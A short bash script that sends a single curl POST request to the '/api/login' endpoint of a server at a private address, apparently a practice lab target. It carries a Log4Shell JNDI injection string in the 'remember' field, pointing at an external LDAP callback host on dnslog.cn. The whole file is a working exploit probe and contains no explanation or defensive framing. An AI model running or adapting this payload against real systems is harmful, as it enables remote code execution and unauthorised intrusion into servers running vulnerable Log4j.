#!/bin/bash

curl -i -s -k -X POST -H $'Host: 10.129.141.95:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://eb0uvi.dnslog.cn:1389/o=tomcat}\",\"strict\":true}' $'https://10.129.141.95:8443/api/login'
